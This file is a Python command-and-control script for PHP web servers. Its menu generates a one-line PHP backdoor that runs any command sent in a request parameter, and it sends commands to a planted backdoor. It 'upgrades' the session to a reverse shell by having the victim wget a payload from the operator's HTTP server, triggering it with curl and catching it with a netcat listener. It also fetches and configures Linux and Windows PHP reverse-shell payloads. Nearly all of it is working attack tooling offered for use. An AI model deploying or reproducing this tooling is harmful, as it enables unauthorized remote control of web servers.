#!/usr/bin/env python3
# Generate/Interface With PHP Webshells/Backdoors
# Setup Listeners to Receive Reverse Shells Via PHP
# Authors: Jessi and Rin
# Usage: ./php-c2.py

import requests
import os
import sys
import re
import time
import fileinput
import threading

# Intro/Art
print("""\
                                              /\                   ,'|
					  o--'O `.                /  /
                                           `--.   `-----------._,' ,'
     /                                         \              ,---'
    //\                                         ) )    _,--(  |
   (o\                                         /,^.---'     )/\\
    ) \	                                      ((   \\      ((  \\
   (___()                                      \)   \) -hh  \) (/""")
print("PHP C2 Framework")
time.sleep(1)
print("Written By: Jessi and Rin")
time.sleep(1)
print("Github: jessisec")
print("Twitter: @jessitakes")
time.sleep(2)

# Background Tasks
# HTTP Server Task
def http_server():
    os.system("python3 -m http.server 80 >/dev/null 2>&1")
def bg_http_server():
    threading.Thread(target=http_server).start()

# Send Reverse Shell Payload Task
def send_payload(url,lhost):
    requests.get(url + 'rm rev.php')
    cmd = 'wget http://' + lhost+'/rev.php'
    send_payload = url + cmd
    requests.get(send_payload)

# Execute Reverse Shell Payload Task
def rev_payload(url):
    rshell = url.replace('backdoor.php?cmd=', 'rev.php')
    os.system("curl "+ rshell+" &")
def bg_rev_payload(url):
    threading.Thread(target=rev_payload(url)).start()

# Services
def listener(lport):
    print("Starting listener...")
    os.system("nc -lvnp " + lport+"")

# PHP Backdoor -> Reverse Shell Upgrade Task
def upgrade(url):
    lhost = input("LHOST: ")
    lport = input("LPORT: ")
    print("Attempting Shell Upgrade...")
    bg_http_server()
    print("HTTP Server Started")
    print("Configuring Payload...")
    os.system("wget https://raw.githubusercontent.com/jessisec/php-c2/main/shells/linux.php -O rev.php >/dev/null 2>&1")
    for line in fileinput.input(['rev.php'], inplace=True):
        print(line.replace('IP_REPLACE_ME', lhost), end='')
    for line in fileinput.input(['rev.php'], inplace=True):
        print(line.replace('PORT_REPLACE_ME', lport), end='')
    print("Payload Configured")
    print("Sending Payload and Starting Listener...")
    send_payload(url,lhost)
    bg_rev_payload(url)
    print("Payload Sent")
    print("Spawning Shell...")
    listener(lport)

# Define Option 1: PHP Backdoor Shell
def opt1(url,ip):
    while(True):
        cmd = input("php-c2@" + ip+"$ ")
        if cmd == "clear":
            os.system("clear")
            print("[PHP Backdoor C2]")
            print("\n")
        elif cmd == "exit":
            exit(0)
        elif cmd == "php-bg":
            exit(0)
        elif cmd == "php-menu":
            menu()
        elif cmd == "php-upgrade":
            upgrade(url)
        shell = url + cmd
        r = requests.get(shell)
        output = r.text
        print(output)

# Define Option 2: PHP Reverse Shell C2
def opt2():
    lport = input("LPORT: ")
    print("Setting up listener...")
    os.system("nc -lvnp " + lport+"")
    exit(0)
    # Placeholder

# Define Option 3: PHP Reverse Shell Generator
def opt3():
    print("PHP Reverse Shell Generator")
    time.sleep(1)
    os.system("clear")
    print("[PHP Reverse Shell Generator]")
    lhost = input("LHOST: ")
    lport = input("LPORT: ")
    ost = input("Linux (1)\Windows (2): ")
    if os.path.exists("rev.php"):
        os.remove("rev.php")
    if ost == "1":
        print("Downloading Linux PHP Reverse Shell...")
        os.system("wget https://raw.githubusercontent.com/jessisec/php-c2/main/shells/linux.php -O rev.php >/dev/null 2>&1")
    elif ost == "2":
        print("Downloading Windows PHP Reverse Shell...")
        os.system("wget https://raw.githubusercontent.com/jessisec/php-c2/main/shells/windows.php -O rev.php >/dev/null 2>&1")
    print("Configuring Variables...")
    time.sleep(1)
    for line in fileinput.input(['rev.php'], inplace=True):
        print(line.replace('IP_REPLACE_ME', lhost), end='')
    for line in fileinput.input(['rev.php'], inplace=True):
        print(line.replace('PORT_REPLACE_ME', lport), end='')
    print("rev.php written to disk!")
    input("Press enter to return to the main menu")

# Define Option 4: PHP Backdoor Generator
def opt4():
    print("PHP Backdoor Generator")
    time.sleep(1)
    print("Generating PHP Backdoor...")
    time.sleep(1)
    f = open("backdoor.php", "w")
    f.write("<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>")
    f.close
    os.system("clear")
    print("[PHP Backdoor Generator]")
    print("Code To Inject:")
    print("<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>")
    print("\n")
    print("backdoor.php written to disk!")
    input("Press enter to return to the main menu")

# Define Menu And Options
def menu():
    os.system("clear")
    print("[PHP C2 Framework]")
    print("""\
                                                                   ,-,
                                                             _.-=;~ /_
                                                          _-~   '     ;.
                                                      _.-~     '   .-~-~`-._
                                                _.--~~:.             --.____88
                              ____.........--~~~. .' .  .        _..-------~~
                     _..--~~~~               .' .'             ,'
                 _.-~                        .       .     ` ,'
               .'                                    :.    ./
             .:     ,/          `                   ::.   ,'
           .:'     ,(            ;.                ::. ,-'
          .'     ./'.`.     . . /:::._______.... _/:.o/
         /     ./'. . .)  . _.,'               `88;?88|
       ,'  . .,/'._,-~ /_.o8P'                  88P ?8b
    _,'' . .,/',-~    d888P'                    88'  88|
 _.'~  . .,:oP'        ?88b              _..--- 88.--'8b.--..__
:     ...' 88o __,------.88o ...__..._.=~- .    `~~   `~~      ~-._ Seal _.
`.;;;:='    ~~            ~~~                ~-    -       -   -""")
    print("[Main Menu]")
    print("\n")
    print("[1] PHP Backdoor C2")
    print("[2] PHP Reverse Shell C2")
    print("[3] PHP Reverse Shell Generator")
    print("[4] PHP Backdoor Generator")
    print("\n")
    print("[5] Exit")
    print("\n")
    # Ask User for Option Input
    opt = input("Select Option: ")
    if opt == "1":
        print("PHP Backdoor C2")
        time.sleep(1)
        os.system("clear")
        print("[PHP Backdoor C2]")
        print("\n")
        ip = input("IP: ")
        path = input("Path To backdoor.php: ")
        url = 'http://' + ip + path+'?cmd='
        os.system("clear")
        print("[PHP Backdoor C2]")
        print("\n")
        print("Connected to: " + ip+"")
        print("PHP C2 Session 1 Established")
        print("\n")
        print("[PHP Backdoor C2 Commands]")
        print("exit = Exit PHP C2 Framework")
        print("php-upgrade = Upgrade current session to reverse shell")
        print("php-menu = Go back to the main menu")
        print("php-bg = Backgronud the current shell")
        print("\n")
        opt1(url,ip)
    elif opt == "2":
        opt2()
    elif opt == "3":
        opt3()
    elif opt == "4":
        opt4()
    elif opt == "5":
        exit(0)

# Menu Interface
while (True):
    menu()
